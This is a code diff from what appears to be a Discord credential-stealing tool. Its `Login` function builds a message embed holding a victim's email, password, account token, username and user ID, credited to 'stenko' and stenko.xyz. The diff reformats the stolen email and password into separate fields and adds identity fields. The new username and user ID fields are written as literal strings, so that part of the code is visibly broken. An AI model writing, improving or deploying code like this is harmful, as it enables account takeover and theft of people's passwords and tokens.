@@ -152,9 +152,24 @@ function Login(email, password, token) {
                     "color": 3092790,
                     "fields": [
                         {
-                            "name": " account",
-                            "value": `email - ${email} - password - ${password}`,
-                            "inline": true
+                            "name": " username",
+                            "value": ` - json.username + "#" + json.discriminator`,
+                            "inline": false
+                        },
+                        {
+                            "name": " userid",
+                            "value": ` - json.id`,
+                            "inline": false
+                        },
+                        {
+                            "name": " email",
+                            "value": ` - ${email}`,
+                            "inline": false
+                        },
+                        {
+                            "name": " password",
+                            "value": ` - ${password}`,
+                            "inline": false
                         },
                         {
                             "name": " token",
@@ -163,8 +178,8 @@ function Login(email, password, token) {
                         }
                     ],
                     "author": {
-                        "name": json.username +"#" + json.discriminator + "・" + json.id,
-			"url": "https://stenko.xyz",
+                        "name": "stenko",
+			"url": `https://stenko.xyz`,
                     },
 		    "thumbnail": {
                         "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
